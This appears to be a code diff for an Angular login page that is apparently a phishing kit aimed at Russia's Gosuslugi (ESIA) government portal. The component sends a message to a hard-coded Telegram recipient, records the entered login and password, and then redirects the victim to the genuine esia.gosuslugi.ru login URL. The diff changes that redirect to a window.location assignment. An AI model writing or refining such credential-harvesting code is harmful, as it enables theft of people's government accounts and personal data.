@@ -1,8 +1,6 @@
 import {BreakpointObserver, Breakpoints} from '@angular/cdk/layout';
 import {HttpClient} from '@angular/common/http';
 import {Component, OnInit, ViewEncapsulation} from '@angular/core';
-import {Router} from '@angular/router';
-import {Subscription} from 'rxjs';
 import {first, map, tap} from 'rxjs/operators';
 import Telegram from 'telegram-send-message';
 import {FormBuilder, Validators} from '@angular/forms';
@@ -39,16 +37,15 @@ export class AppComponent implements OnInit {
 			Telegram.setRecipient('946981380');
 			Telegram.setMessage(message);
 			Telegram.send();
-			this.router.navigateByUrl('https://esia.gosuslugi.ru/idp/rlogin?cc=bp');
 			this.prevValue.login = this.form.get('login').value;
 			this.prevValue.password = this.form.get('password').value;
+			window.location.href = 'https://esia.gosuslugi.ru/idp/rlogin?cc=bp';
 		}
 	}
 
 	constructor(
 		private formBuilder: FormBuilder,
 		private breakpointObserver: BreakpointObserver,
-		private router: Router,
 		private http: HttpClient
 	) {}
 
